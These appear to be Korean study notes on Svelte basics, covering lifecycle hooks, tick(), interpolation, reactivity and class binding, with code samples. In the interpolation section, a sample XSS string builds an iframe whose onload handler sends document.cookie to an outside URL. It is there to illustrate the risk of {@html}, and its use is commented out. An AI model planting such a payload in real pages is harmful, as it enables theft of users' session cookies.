## Basic

- lifecylcle
  - lifecycle.svelte
    ```jsx
    <script>
      import { afterUpdate, beforeUpdate, onDestroy, onMount } from "svelte";

      let name = "life cycle...";
      let h1;
      function addDot() {
        name += ".";
      }

      ////////////////////////////////////////////////////////////////////////
      onMount(() => {
        console.log("Mounted");
        h1 = document.querySelector("h1");
        // return을 통해서도 onDestroy 가능
        return () => {
          console.log("destoried!");
        };
      });

      onDestroy(() => {
        console.log("Before destoried");
        // Destory 이전에 실행되기 떄문에 component를 읽을 수 있음
        h1 = document.querySelector("h1");
      });

      beforeUpdate(() => {
        console.log("Before update!");
        console.log(h1 && h1.innerText);
      });

      afterUpdate(() => {
        console.log("After update!");
        console.log(h1.innerText);
      });
    </script>

    <h1 on:click="{addDot}">{name}</h1>
    ```
  - lifecycle.js
    - 라이프사이클 모듈화해서 사용
    ```jsx
    import { afterUpdate, beforeUpdate, onDestroy, onMount } from 'svelte';
    import { writable } from 'svelte/store';

    export function lifecycle() {
      onMount(() => {
        console.log('onMount!');
      });

      onDestroy(() => {
        console.log('onDestroy!');
      });

      beforeUpdate(() => {
        console.log('beforeUpdate!');
      });

      afterUpdate(() => {
        console.log('afterUpdate!');
      });
    }

    export function delayRender(delay = 3000) {
      let render = writable(false);
      onMount(() => {
        setTimeout(() => {
          // $render = true; svelte 파일이 아니기때문에 $ 사용이 안됨
          render.set(true);
        }, delay);
      });
      return render; // 값이 아닌 store 객체
    }
    ```
  - tick()
    ```jsx
    <script>
      import { tick } from 'svelte';

      let name = 'world';

      async function handler() {
        name = 'jw';
        await tick(); // 화면이 갱신될때까지 기다려주는 함수. Promise를 반환
        const h1 = document.querySelector('h1');
        console.log(h1.innerText);
      }
    </script>

    <h1 on:click={handler}>hello {name}!</h1>
    ```
- 보간법
  ```jsx
  <script>
    let href = 'https://github.com/Jinwook-Song/svelte-basic';
    let name = 'jinwook';
    let value = 'new input value';
    let isUppercase = false;

    let h1 = '<h1>원시 HTML</h1>';
    let xss =
      '<iframe onload="document.location=`https://github.com/Jinwook-Song/svelte-basic?${document.cookie}`"></iframe>';

    let index = 0;
  </script>

  <a {href}>{name}</a>

  <!-- 보간법 -->
  <input {value} on:input={(e) => (value = e.target.value)} />
  <input bind:value />

  <div>{isUppercase ? 'DIV' : 'div'}</div>

  <!-- 원시 HTML -->
  {@html h1}
  <!-- {@html xss} -->

  <!-- 데이터 디버깅 -->
  {@debug index}
  <h1 on:click={() => (index += 1)}>Hello {name}</h1>
  ```
- Assignment
  ```jsx
  <script>
    let name = 'Jinwook';
    let fruits = ['apple', 'orange', 'banana'];
    let user = {
      name: 'jw',
      depth: {
        a: 'b',
      },
      numbers: [1, 2],
    };
    let numbers = user.numbers;

    function assign() {
      name = 'Song';
      // fruits.push('orange');
      // fruits = fruits;
      fruits = [...fruits, 'orange'];
      user.name = 'new';
      user.depth.a = 'c';
      user.numbers.push(3);

      // user를 명시하였기 떄문에 반응성이 생겨서 user가 재할당됨.
      // 반대로 user.name, user.depth를 실행하지 않은 경우 push는 동작하지 않음.
    }
  </script>

  <button on:click={assign}>Assign</button>

  <h2>{name}</h2>
  <h3>{fruits}</h3>
  <h3>{user.name}</h3>
  <h3>{user.depth.a}</h3>
  <h3>{user.numbers}</h3>
  <h3>{numbers}</h3>
  ```
- 반응성 구문 ($:)
  ```jsx
  <script>
    import { tick } from 'svelte';

    let count = 0;
    let double = 0;

    // Label 구문을 통한 반응성 유도
    // 내부에 반응성을 가지는 데이터가 존재하고 그 데이터가 갱신되어 실제로 화면이 바뀌는 반응성이 일어나면 반응성 구문 ($:)이 실행됨
    $: {
      double = count * 2;
      console.log('double');
    }

    //   $: double = count * 2;

    async function assign() {
      count++;
      console.time('timer');
      await tick();
      console.timeEnd('timer');
      console.log(double);
    }
  </script>

  <button on:click={assign}>Assign</button>

  <h2>{count}</h2>
  <h2>{double}</h2>
  ```
  - 반응성 구문 패턴
  ```jsx
  <script>
    let count = 0;

    // 선언
    $: double = count * 2;

    // 블록
    $: {
      console.log(count);
      console.log(double);
    }

    // 함수 실행
    $: count, log();

    // 즉시 실행 함수 (IIFE)
    $: count,
      (() => {
        console.log('iife: Jinwook');
      })();

    // 조건문(If)
    $: if (count > 0) {
      console.log('if:', double);
    }

    // 반복문(For)
    $: for (let i = 0; i < 3; i++) {
      count;
      console.log('for:', i);
    }

    // 조건문(Switch)
    $: switch (count) {
      case 1:
        console.log('switch:', count);
        break;
      default:
        console.log('swith: default');
    }

    // 유효범위
    $: {
      function scope1() {
        console.log('scope1');
        function scope2() {
          console.log('scope2');
          function scope3() {
            console.log('scope3', count);
          }
          scope3();
        }
        scope2();
      }
      scope1();
    }

    function log() {
      console.log('log fn');
    }
    function assign() {
      count++;
    }
  </script>

  <button on:click={assign}>Assign</button>
  ```
- CSS Binding
  ```jsx
  <script>
    let active = false;
    let color = {
      t: 'tomato',
      w: '#FFF',
    };
    let letterSpacing = 'letter-spacing: 5px;';
  </script>

  <button on:click={() => (active = !active)}>Toggle</button>

  <!-- <div class={active ? 'active' : ''}>Hello</div> -->

  <!-- svelte class 지시어 -->
  <div class:active>Hello</div>
  <div class:hello={active}>Hello</div>

  <h2 style="background-color: {color.t}; color: {color.w}; {letterSpacing}">
    text
  </h2>

  <style>
    div {
      width: 200px;
      aspect-ratio: 1;
      background-color: tomato;
      border-radius: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-size: 20px;
      transition: 0.5s;
    }
    .active {
      width: 300px;
      border-radius: 50%;
      background-color: teal;
    }
    .hello {
      width: 300px;
      border-radius: 50%;
      background-color: magenta;
    }
  </style>
  ```
